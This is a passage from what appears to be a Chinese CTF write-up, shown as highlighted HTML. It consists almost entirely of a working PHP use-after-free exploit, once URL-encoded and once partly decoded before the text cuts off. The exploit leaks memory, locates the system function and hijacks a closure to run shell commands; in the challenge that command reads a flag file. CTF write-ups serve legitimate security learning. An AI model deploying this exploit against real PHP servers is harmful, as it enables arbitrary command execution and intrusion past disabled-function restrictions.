class="title">p_vaddr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">data_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>p_type%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">201</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>p_flags%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">205</span></span>)%20%7<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">text_size</span>%20%3<span class="title">D</span>%20%24<span class="title">p_memsz</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">!%<span class="number">24</span>data_addr%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>text_size%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>!%<span class="number">24</span>data_size</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20%5<span class="title">B</span>%24<span class="title">data_addr</span>%2<span class="title">C</span>%20%24<span class="title">text_size</span>%2<span class="title">C</span>%20%24<span class="title">data_size</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_basic_funcs</span>(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">list</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>text_size%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>data_size</span>)%20%3<span class="title">D</span>%20%24<span class="title">elf</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_size%<span class="number">20</span>%<span class="number">2</span>F%<span class="number">208</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x746e6174736e6f63</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>data_addr%<span class="number">2</span>C%<span class="number">20</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">204</span></span>)%<span class="number">20</span>*%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">200</span>%<span class="number">20</span>%<span class="number">26</span>%<span class="number">26</span>%<span class="number">20</span>%<span class="number">24</span>leak%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>data_addr%<span class="number">20</span>-%<span class="number">20</span>%<span class="number">24</span>base</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">deref</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>leak</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>deref%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span>x786568326e6962</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">else</span>%20<span class="title">continue</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">data_addr</span>%20%2<span class="title">B</span>%20%24<span class="title">i</span>%20*%208%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_binary_base</span>(<span class="params">%<span class="number">24</span>binary_leak</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">base</span>%20%3<span class="title">D</span>%200%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">start</span>%20%3<span class="title">D</span>%20%24<span class="title">binary_leak</span>%20%26%200<span class="title">xfffffffffffff000</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x1000%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">start</span>%20-%200<span class="title">x1000</span>%20*%20%24<span class="title">i</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">207</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>leak%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x10102464c457f</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20%24<span class="title">addr</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">get_system</span>(<span class="params">%<span class="number">24</span>basic_funcs</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%3<span class="title">D</span>%20%24<span class="title">basic_funcs</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">do</span>%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_entry</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">f_name</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">2</span>C%<span class="number">200</span>%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">if</span>(<span class="params">%<span class="number">24</span>f_name%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span>x6d6574737973</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%20%20%20%20%24<span class="title">addr</span>%20%2<span class="title">B</span>%3<span class="title">D</span>%200<span class="title">x20</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%7<span class="title">D</span>%20<span class="title">while</span>(<span class="params">%<span class="number">24</span>f_entry%<span class="number">20</span>!%<span class="number">3</span>D%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">return</span>%20<span class="title">false</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">function</span>%20<span class="title">trigger_uaf</span>(<span class="params">%<span class="number">24</span>arg</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">arg</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Vuln</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">vuln</span>-%3<span class="title">Ea</span>%20%3<span class="title">D</span>%20%24<span class="title">arg</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">stristr(<span class="params">PHP_OS%<span class="number">2</span>C%<span class="number">20</span><span class="string">&#x27;WIN&#x27;</span></span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params"><span class="string">&#x27;This%20PoC%20is%20for%20*nix%20systems%20only.&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">n_alloc</span>%20%3<span class="title">D</span>%2010%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20%24<span class="title">contiguous</span>%20%3<span class="title">D</span>%20%5<span class="title">B</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">20</span>%<span class="number">24</span>n_alloc%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>B%<span class="number">2</span>B</span>)%0<span class="title">A</span>%20%20%20%20%20%20%20%20%24<span class="title">contiguous</span>%5<span class="title">B</span>%5<span class="title">D</span>%20%3<span class="title">D</span>%20<span class="title">str_shuffle</span>(<span class="params"><span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">trigger_uaf</span>(<span class="params"><span class="string">&#x27;x&#x27;</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc</span>%20%3<span class="title">D</span>%20%24<span class="title">backtrace</span>%5<span class="title">B1</span>%5<span class="title">D</span>%5<span class="title">B</span>&#x27;<span class="title">args</span>&#x27;%5<span class="title">D</span>%5<span class="title">B0</span>%5<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>%20%3<span class="title">D</span>%20<span class="title">new</span>%20<span class="title">Helper</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">helper</span>-%3<span class="title">Eb</span>%20%3<span class="title">D</span>%20<span class="title">function</span>%20(<span class="params">%<span class="number">24</span>x</span>)%20%7<span class="title">B</span>%20%7<span class="title">D</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">2079</span>%<span class="number">20</span>%<span class="number">7</span>C%<span class="number">7</span>C%<span class="number">20</span>strlen(<span class="params">%<span class="number">24</span>abc</span>)%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">200</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>UAF%<span class="number">20</span>failed%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_handlers</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">php_heap</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x58</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">abc_addr</span>%20%3<span class="title">D</span>%20%24<span class="title">php_heap</span>%20-%200<span class="title">xc8</span>%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x60%<span class="number">2</span>C%<span class="number">202</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x70%<span class="number">2</span>C%<span class="number">206</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x10%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x60</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x18%<span class="number">2</span>C%<span class="number">200</span>xa</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">closure_obj</span>%20%3<span class="title">D</span>%20<span class="title">str2ptr</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20</span>)%3<span class="title">B</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">binary_leak</span>%20%3<span class="title">D</span>%20<span class="title">leak</span>(<span class="params">%<span class="number">24</span>closure_handlers%<span class="number">2</span>C%<span class="number">208</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>base%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_binary_base(<span class="params">%<span class="number">24</span>binary_leak</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>parse%<span class="number">20</span>ELF%<span class="number">20</span>header%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">if</span>(<span class="params">!(<span class="params">%<span class="number">24</span>basic_funcs%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>get_basic_funcs(<span class="params">%<span class="number">24</span>base%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>elf</span>)</span>)</span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">die</span>(<span class="params">%<span class="number">22</span>Couldn<span class="string">&#x27;t%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn&#x27;</span>t%<span class="number">20</span>get%<span class="number">20</span>zif_system%<span class="number">20</span>address%<span class="number">22</span></span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20%24<span class="title">fake_obj_offset</span>%20%3<span class="title">D</span>%200<span class="title">xd0</span>%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">for</span>(<span class="params">%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">200</span>%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">3</span>C%<span class="number">200</span>x110%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">3</span>D%<span class="number">208</span></span>)%20%7<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>i%<span class="number">2</span>C%<span class="number">20</span>leak(<span class="params">%<span class="number">24</span>closure_obj%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>i</span>)</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>x20%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>abc_addr%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">20</span>%<span class="number">24</span>fake_obj_offset</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x38%<span class="number">2</span>C%<span class="number">201</span>%<span class="number">2</span>C%<span class="number">204</span></span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%20%20%20%20<span class="title">write</span>(<span class="params">%<span class="number">24</span>abc%<span class="number">2</span>C%<span class="number">200</span>xd0%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x68%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>zif_system</span>)%3<span class="title">B</span>%20%0<span class="title">A</span>%0<span class="title">A</span>%20%20%20%20(<span class="params">%<span class="number">24</span>helper-%<span class="number">3</span>Eb</span>)(<span class="params">%<span class="number">24</span>cmd</span>)%3<span class="title">B</span>%0<span class="title">A</span>%20%20%20%20<span class="title">exit</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%7<span class="title">D</span>%0<span class="title">A</span>%0<span class="title">Actfshow</span>(<span class="params">%<span class="number">22</span>cat%<span class="number">20</span>%<span class="number">2</span>Fflag0.txt%<span class="number">22</span></span>)%3<span class="title">Bob_end_flush</span>(<span class="params"></span>)%3<span class="title">B</span>%0<span class="title">A</span>%3<span class="title">F</span>%3<span class="title">E</span></span></span><br></pre></td></tr></table></figure><p>注意这个payload把方法当函数了，但是本质是一样的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span 